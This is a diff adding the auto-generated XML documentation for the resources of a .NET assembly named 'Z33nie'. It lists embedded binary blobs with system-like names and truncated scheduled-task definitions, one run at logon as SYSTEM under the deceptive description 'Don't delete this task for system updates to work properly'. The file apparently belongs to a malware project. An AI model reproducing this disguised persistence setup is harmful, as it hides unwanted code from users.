@@ -1,0 +1,103 @@
+﻿<?xml version="1.0"?>
+<doc>
+<assembly>
+<name>
+Z33nie
+</name>
+</assembly>
+<members>
+<member name="P:Z33nie.My.Resources.Resources.ResourceManager">
+	<summary>
+  Returns the cached ResourceManager instance used by this class.
+</summary>
+</member><member name="P:Z33nie.My.Resources.Resources.Culture">
+	<summary>
+  Overrides the current thread's CurrentUICulture property for all
+  resource lookups using this strongly typed resource class.
+</summary>
+</member><member name="P:Z33nie.My.Resources.Resources._error">
+	<summary>
+  Looks up a localized resource of type System.Byte[].
+</summary>
+</member><member name="P:Z33nie.My.Resources.Resources.app">
+	<summary>
+  Looks up a localized resource of type System.Byte[].
+</summary>
+</member><member name="P:Z33nie.My.Resources.Resources.eventmgr">
+	<summary>
+  Looks up a localized resource of type System.Byte[].
+</summary>
+</member><member name="P:Z33nie.My.Resources.Resources.ExceptionHandler">
+	<summary>
+  Looks up a localized resource of type System.Byte[].
+</summary>
+</member><member name="P:Z33nie.My.Resources.Resources.SysConfigDataINIT">
+	<summary>
+  Looks up a localized string similar to &lt;?xml version="1.0" encoding="UTF-16"?&gt;
+&lt;Task version="1.3" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"&gt;
+  &lt;RegistrationInfo&gt;
+    &lt;Date&gt;2016-06-09T22:38:20.6611384&lt;/Date&gt;
+    &lt;Author&gt;SYSTEM&lt;/Author&gt;
+    &lt;Description&gt;*Don't delete this task for system updates to work properly*&lt;/Description&gt;
+  &lt;/RegistrationInfo&gt;
+  &lt;Triggers&gt;
+    &lt;LogonTrigger&gt;
+      &lt;Enabled&gt;true&lt;/Enabled&gt;
+    &lt;/LogonTrigger&gt;
+  &lt;/Triggers&gt;
+  &lt;Principals&gt;
+    &lt;Principal id="Author"&gt;
+.
+</summary>
+</member><member name="P:Z33nie.My.Resources.Resources.syslog32">
+	<summary>
+  Looks up a localized resource of type System.Byte[].
+</summary>
+</member><member name="P:Z33nie.My.Resources.Resources.syslog64">
+	<summary>
+  Looks up a localized resource of type System.Byte[].
+</summary>
+</member><member name="P:Z33nie.My.Resources.Resources.System_Core">
+	<summary>
+  Looks up a localized resource of type System.Byte[].
+</summary>
+</member><member name="P:Z33nie.My.Resources.Resources.System_Management_Automation">
+	<summary>
+  Looks up a localized resource of type System.Byte[].
+</summary>
+</member><member name="P:Z33nie.My.Resources.Resources.System_XML">
+	<summary>
+  Looks up a localized resource of type System.Byte[].
+</summary>
+</member><member name="P:Z33nie.My.Resources.Resources.System_Xml_Linq">
+	<summary>
+  Looks up a localized resource of type System.Byte[].
+</summary>
+</member><member name="P:Z33nie.My.Resources.Resources.TempCacheflush">
+	<summary>
+  Looks up a localized string similar to &lt;?xml version="1.0" encoding="UTF-16"?&gt;
+&lt;Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"&gt;
+  &lt;RegistrationInfo&gt;
+    &lt;Date&gt;2016-07-19T20:48:21.7229273&lt;/Date&gt;
+    &lt;Author&gt;SYSTEM&lt;/Author&gt;
+  &lt;/RegistrationInfo&gt;
+  &lt;Triggers&gt;
+    &lt;RegistrationTrigger&gt;
+      &lt;Enabled&gt;true&lt;/Enabled&gt;
+    &lt;/RegistrationTrigger&gt;
+  &lt;/Triggers&gt;
+  &lt;Principals&gt;
+    &lt;Principal id="Author"&gt;
+.
+</summary>
+</member><member name="P:Z33nie.My.Resources.Resources.wall">
+	<summary>
+  Looks up a localized resource of type System.Drawing.Bitmap.
+</summary>
+</member><member name="T:Z33nie.My.Resources.Resources">
+	<summary>
+  A strongly-typed resource class, for looking up localized strings, etc.
+</summary>
+</member>
+</members>
+</doc>
